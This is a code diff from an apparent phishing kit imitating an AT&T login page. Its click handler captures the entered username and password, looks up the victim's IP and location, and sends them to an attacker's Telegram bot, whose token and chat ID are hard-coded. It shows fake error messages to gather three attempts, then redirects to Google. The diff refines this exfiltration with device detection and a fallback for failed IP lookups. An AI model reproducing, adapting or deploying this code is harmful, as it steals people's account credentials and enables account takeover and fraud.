@@ -421,65 +421,78 @@
     pwdInput.addEventListener('input', () => errorMessage.style.display = 'none');
   
     btnSignIn.addEventListener('click', (e) => {
-      e.preventDefault();
-  
-      const username = useridInput.value.trim();
-      const password = pwdInput.value.trim();
-  
-      attemptCount++;
-  
-      const attemptInfo = {
-        attempt: attemptCount,
-        username,
-        password,
-        status: attemptCount === 3 ? "✅ Final Attempt" : "❌ Failed"
-      };
-  
-      attemptData.push(attemptInfo);
-  
-      // Fetch IP and send message immediately
-      fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(ipinfo => {
-          const timestamp = new Date().toUTCString();
-          let message = `🔐 AT&T Login Attempt\n\n`;
-          message += `#${attemptInfo.attempt} ${attemptInfo.status}\n`;
-          message += `👤 Username: ${attemptInfo.username}\n`;
-          message += `🔑 Password: ${attemptInfo.password}\n\n`;
-          message += `🕒 Time: ${timestamp}\n`;
-          message += `🌍 Location: ${ipinfo.city}, ${ipinfo.country_name}\n`;
-          message += `📡 IP: ${ipinfo.ip}`;
-  
-          const chatId = '5613637159';
-          const botToken = '7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s';
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-  
-          if (navigator.onLine) {
-            return fetch(url);
-          } else {
-            console.warn("Offline: Cannot send to Telegram");
-            console.log("Message:\n", message);
-            return Promise.resolve();
-          }
-        })
-        .then(() => {
-          if (attemptCount < 3) {
-            errorMessage.style.display = 'block';
-            pwdInput.value = '';
-            pwdInput.focus();
-          } else {
-            window.location.href = 'https://www.google.com';
-          }
-        })
-        .catch(err => {
-          console.error("Error sending data", err);
-          if (attemptCount >= 3) {
-            window.location.href = 'https://www.google.com';
-          } else {
-            errorMessage.style.display = 'block';
-          }
-        });
+  e.preventDefault();
+
+  const username = useridInput.value.trim();
+  const password = pwdInput.value.trim();
+
+  attemptCount++;
+
+  const attemptInfo = {
+    attempt: attemptCount,
+    username,
+    password,
+    status: attemptCount === 3 ? "✅ Final Attempt" : "❌ Failed"
+  };
+
+  attemptData.push(attemptInfo);
+
+  const timestamp = new Date().toUTCString();
+
+  // Fetch IP info but don't block sending to Telegram if it fails
+fetch('https://ipapi.co/json/')
+  .then(res => res.json())
+  .catch(() => ({
+    city: 'Unknown',
+    country_name: 'Unknown',
+    ip: 'Unavailable'
+  }))
+  .then(ipinfo => {
+    // Detect device type from User-Agent
+    let deviceType = "Unknown";
+    const ua = attemptInfo.userAgent || ""; // make sure you have userAgent in attemptInfo
+    if (/mobile/i.test(ua)) {
+      deviceType = "Mobile";
+    } else if (/tablet/i.test(ua)) {
+      deviceType = "Tablet";
+    } else if (/desktop|windows|macintosh|linux/i.test(ua)) {
+      deviceType = "Desktop";
+    }
+
+    let message = `🔐 AT&T Login Attempt\n\n`;
+    message += `#${attemptInfo.attempt} ${attemptInfo.status}\n`;
+    message += `👤 Username: ${attemptInfo.username}\n`;
+    message += `🔑 Password: ${attemptInfo.password}\n\n`;
+    message += `🕒 Time: ${timestamp}\n`;
+    message += `🌍 Location: ${ipinfo.city}, ${ipinfo.country_name}\n`;
+    message += `📡 IP: ${ipinfo.ip}\n`;
+    message += `📱 Device: ${deviceType}`;
+
+      const chatId = '5613637159';
+      const botToken = '7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s';
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Send message to Telegram
+      return fetch(url);
+    })
+    .then(() => {
+      if (attemptCount < 3) {
+        errorMessage.style.display = 'block';
+        pwdInput.value = '';
+        pwdInput.focus();
+      } else {
+        window.location.href = 'https://www.google.com';
+      }
+    })
+    .catch(err => {
+      console.error("Error sending data", err);
+      if (attemptCount >= 3) {
+        window.location.href = 'https://www.google.com';
+      } else {
+        errorMessage.style.display = 'block';
+      }
     });
+});
   </script>
   
 
